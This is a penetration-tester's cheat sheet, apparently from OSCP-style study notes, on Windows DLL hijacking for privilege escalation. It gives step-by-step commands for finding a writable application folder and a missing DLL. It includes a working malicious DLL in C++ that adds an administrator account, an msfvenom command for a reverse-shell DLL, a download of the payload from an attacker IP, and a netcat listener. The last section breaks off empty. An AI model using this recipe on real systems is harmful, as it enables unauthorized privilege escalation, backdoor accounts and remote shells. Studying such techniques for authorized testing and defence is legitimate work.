# DLL Hijacking

Steps:

1. [check installed applications](dll-hijacking.md#id-1.-enumerate-installed-applications)
2. [check if any applications / versions are vulnerable](dll-hijacking.md#id-2.-check-for-vulns)
3. [check if you can write to write to the vulnerable application directory](dll-hijacking.md#id-3.-check-if-you-can-write-to-the-directory)
4. [use process monitor on vuln application](dll-hijacking.md#id-4.-process-monitor)
5. [create DLL](dll-hijacking.md#id-5.-create-dll)
6. [install malicious DLL](dll-hijacking.md#id-6.-install-malicious-dll)
7. [wait for someone with higher privs to run the application / confirm user is created](dll-hijacking.md#id-7.-escalate-privileges)

### _<mark style="background-color:purple;">**1. enumerate installed applications**</mark>_

{% code overflow="wrap" %}
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
{% endcode %}

### _<mark style="background-color:purple;">**2. check for vulns**</mark>_

google applications and versions to check for vulns

<mark style="background-color:blue;">check file permissions:</mark>

&#x20;list [permissions ](service-binary-hijacking.md#enumerate-permissions-on-service-binaries)of the binary file:

```powershell
icacls .\Documents\BetaServ.exe
```

_file permissions to check for:_

* **(F)** - Full access
* **(M)** - Modify access

### _<mark style="background-color:purple;">**3. check if you can write to the directory:**</mark>_

{% code overflow="wrap" %}
```powershell
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
```
{% endcode %}

### _<mark style="background-color:purple;">**4. process monitor**</mark>_

With <mark style="color:red;background-color:red;">**admin creds**</mark> to run pm:

1. <mark style="background-color:red;">filter PM to only events related to the application:</mark>
   * _<mark style="background-color:red;">Process Name</mark>_ <mark style="background-color:red;"></mark><mark style="background-color:red;">as</mark> <mark style="background-color:red;"></mark>_<mark style="background-color:red;">Column</mark>_<mark style="background-color:red;">,</mark> <mark style="background-color:red;"></mark>_<mark style="background-color:red;">is</mark>_ <mark style="background-color:red;"></mark><mark style="background-color:red;">as</mark> <mark style="background-color:red;"></mark>_<mark style="background-color:red;">Relation</mark>_<mark style="background-color:red;">,</mark> <mark style="background-color:red;"></mark>_<mark style="background-color:red;">filezilla.exe</mark>_ <mark style="background-color:red;"></mark><mark style="background-color:red;">as</mark> <mark style="background-color:red;"></mark>_<mark style="background-color:red;">Value</mark>_<mark style="background-color:red;">, and</mark> <mark style="background-color:red;"></mark>_<mark style="background-color:red;">Include</mark>_ <mark style="background-color:red;"></mark><mark style="background-color:red;">as</mark> <mark style="background-color:red;"></mark>_<mark style="background-color:red;">Action</mark>_<mark style="background-color:red;">.</mark>
2. <mark style="background-color:red;">clear all current events in pm</mark>
3. <mark style="background-color:red;">restart application</mark>\ <mark style="background-color:red;">\`Restart-Service {application}'</mark>
4. <mark style="background-color:red;">run the vuln application as the currently logged in user</mark>
5. <mark style="background-color:red;">update our filters to look for only</mark> <mark style="background-color:red;"></mark>_<mark style="background-color:red;">CreateFile</mark>_ <mark style="background-color:red;"></mark><mark style="background-color:red;">operations. Alsp, limit search results by looking for the specificl DLL name inside the</mark> <mark style="background-color:red;"></mark>_<mark style="background-color:red;">Path</mark>_<mark style="background-color:red;">.</mark>
   * _<mark style="background-color:red;">Path contains {DLL name}</mark>_
6. <mark style="background-color:red;">look for result '</mark>_<mark style="background-color:red;">NAME NOT FOUND</mark>_<mark style="background-color:red;">' - can abuse the missing DLL</mark>

### _**5. create DLL**_

#### _<mark style="background-color:blue;">**Malicious DLL to create a new user**</mark>_

{% code title="adduser.cpp" overflow="wrap" %}
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
{% endcode %}

* compile DLL

{% code overflow="wrap" %}
```shell
x86_64-w64-mingw32-gcc TextShaping.cpp -shared -o TextShaping.dll
```
{% endcode %}

* `-shared` specify that we want to build a DLL

#### _<mark style="background-color:blue;">**Malicious DLL with reverse payload**</mark>_

{% code overflow="wrap" %}
```shell
msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f dll -o {target dll}.dll
```
{% endcode %}

### _<mark style="background-color:purple;">**6. install malicious DLL**</mark>_

start a python webserver on kali to download the created DLL on the target machine

{% code overflow="wrap" %}
```powershell
iwr -uri http://192.168.45.215/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```
{% endcode %}

### _<mark style="background-color:purple;">**7. Escalate privileges**</mark>_

#### &#x20;_**wait for someone with higher privs to run the application / confirm user is created****&#x20;**<mark style="color:purple;">**- DLL to add user**</mark>_

```powershell
net user 
net localgroup administrators
Restart-Service BetaService
```

#### &#x20;_**Run the application to connect via bind shell****&#x20;**<mark style="color:purple;">**- DLL with reverse shell**</mark>_

<mark style="color:purple;">\[kali]</mark>

`nc -lvnp 1234`&#x20;

\[windows]

